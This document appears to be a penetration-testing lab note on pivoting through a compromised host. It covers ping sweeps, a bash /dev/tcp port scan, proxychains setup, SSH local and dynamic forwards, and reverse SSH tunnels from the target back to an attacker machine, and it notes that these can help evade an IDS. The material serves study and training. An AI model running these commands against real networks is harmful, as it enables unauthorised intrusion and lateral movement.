There are two main methods encompassed in this area of pentesting:

-   **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall  
    
-   **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host


#### Enumeration
Command:

`arp -a`

` cat /etc/hosts`


`cat /etc/resolv.conf`

---

Before putting this all into practice let's talk about living off the land shell techniques. Ideally a **tool like Nmap** will already be installed on the target; however, this is **not always** the case (indeed, you'll find that Nmap is **not** installed on the currently compromised server of the Wreath network). I


```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

```

If you suspect that a host is active **but is blocking ICMP**ping requests, you could also check some common ports using a tool like `netcat`.

Port scanning in bash can be done (ideally) entirely natively:

```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```



#### Proxychains & Foxyproxy



`proxychains nc 172.16.0.10 23`

`cp /etc/proxychains.conf .`

`.proxychains`

`/etc/proxychains.conf`

ProxyList
socks4 127.0.0.1 9050

set burpsuit

#### SSH Tunnelling / Port Forwarding


There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

-   Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:  
    `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  
    We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.


-   Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:  
    `ssh -D 1337 user@172.16.0.5 -fN`  
    This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.


**Reverse Connections**

1- First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):
```
ssh-keygen

ls -l reverse*
```

2- Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file firs

3- On a new line, type the following line, then paste in the public key:
`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`

4 -Next. check if the SSH server on your attacking machine is running:  
`sudo systemctl status ssh`

5- If the status command indicates that the server is not running then you can start the ssh service with:  
`sudo systemctl start ssh`

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

6- With the key transferred, we can then connect back with a reverse port forward using the following command:  
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN   `

7- To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:  
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN   `

KeyFile = id_rsa

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

8- In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:  
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`  

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.